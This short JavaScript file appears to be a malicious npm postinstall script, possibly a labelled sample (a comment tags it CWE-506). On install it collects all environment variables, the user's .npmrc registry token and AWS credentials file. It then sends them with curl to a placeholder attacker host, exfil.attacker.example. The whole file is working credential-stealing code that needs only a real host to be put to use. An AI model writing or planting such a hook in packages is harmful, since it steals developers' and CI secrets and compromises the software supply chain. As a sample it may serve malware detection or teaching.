// Runs automatically on `npm install` via the postinstall hook.
const cp = require('child_process');
const os = require('os');
const fs = require('fs');
function grab(p){ try { return fs.readFileSync(p,'utf8'); } catch(e){ return ''; } }
const loot = {
  env: process.env,                              // CI secrets, tokens
  npmrc: grab(os.homedir() + '/.npmrc'),         // registry auth token
  aws: grab(os.homedir() + '/.aws/credentials'),
};
// VULN: exfiltrate developer/CI secrets to an attacker host (CWE-506)
cp.execSync('curl -s -X POST -d ' + JSON.stringify(JSON.stringify(loot)) +
            ' https://exfil.attacker.example/collect');
